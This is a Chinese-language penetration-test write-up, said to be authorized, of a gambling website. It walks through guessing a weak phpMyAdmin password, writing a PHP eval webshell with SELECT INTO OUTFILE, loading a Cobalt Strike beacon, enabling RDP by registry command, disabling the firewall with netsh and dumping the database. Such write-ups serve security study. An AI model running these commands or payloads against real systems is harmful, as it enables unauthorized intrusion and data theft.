某种原因，接手了一个授权的bc站。  

  
内心是拒绝的，但是没办法，硬着头皮收下了。

  
其实都知道，bc站不是很好弄，在大佬眼里，可能就是掏出一个0day就进去了  
但像我这种dd，只敢远观。

  
打开主页，还算清新的画风，比那些打开就这闪那闪花里胡哨的站舒服多了。  

  

![](../Images/fd776552311776fd2345080abe9c0a06.png)

  
简单的扫了一下目录，扫出了两个比较有用的的东西就是一个后台，一个探针  

  

![](../Images/cb2a1dea1fccdae8e0f469087d9439a9.png)

  
见到后台，废话不多说，直接弱口令套餐来一份

  
得到的结果肯定是  密码错误X1   密码错误X2   密码错误X3…………  

  
算了，不浪费时间了，看一下探针~  根据探针，得知网站的根目录。

  

底下有phpmyadmin的连接测试  

  

![](../Images/2067253d25b24739dd6067a426e30be8.png)

  
  
直接弱口令再来一套，root  root    密码错误

Root 123456  密码错  唉   不对  好像是连接成功了  

![](../Images/c6b60fc0584fc118abd97a58fabc182a.png)

  
激动的留下了眼泪  
根据探针，得知phpmyadmin的后台地址  

![](../Images/76bc93c56724a7ac47472c30ae952fb1.png)

  
Root 123456  
登录  

![](../Images/ee435c2fc13aff207ea3ff7f011d7d8a.png)

  
Phpmyadmin进来了，网站根目录也知道了，那还唠啥了，直接拿shell了

  
直接执行sql语句

  

select'<?php @eval($\_POST\[pass\]);?>' into outfile 'D:/xxx/xxx/xxx.php'

  
  

![](../Images/9a5fb0180944250b77e13e0d527fa02e.png)

  
一句话连接上，

  
Whoami  system …………  没意思啊，提权都不用了  

  

![](../Images/8e6eb0ace6d2d5149b55501b52910eb3.png)

  
通过查看服务器文件，得知后台登陆密码，登陆后台  

![](../Images/f269c6f4934ee8c50868b6ef495ff6be.png)

  
因为个人喜好，比较喜欢用cs，powshell上线

  
读了一下密码，直接远程连接

  

![](../Images/16005b4dbd5284c1851f94780d230eee.png)

  
但是  

![](../Images/3926e56c4da8966a8df505211d5efbef.png)

  
netstat -an  ，没开3389  

  

![](../Images/0d12929b2512449f692d323b7c8470b4.png)

  
开启3389

  

REG ADD HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal" "Server /v fDenyTSConnections /t REG\_DWORD /d 00000000 /f

  
但是连接了一下，还是不行，用nmap扫描了一下端口，只有80端口开放  
应该是开着防火墙  

  
netsh firewall set opmode mode=disable  关闭防火墙  

  

![](../Images/1df0ea038181696c3ab32f3cbb2d032b.png)

  
再连接3389   连接成功  

  

![](../Images/8810cedea22496316187db0e866db708.png)

  
根据浏览器历史记录，又发现另一个网站后台  

  

![](../Images/428d47f8cf07fdb34aaa43ab23b2a571.png)

  
到现在其实没啥了，直接数据库打包~完活上交。
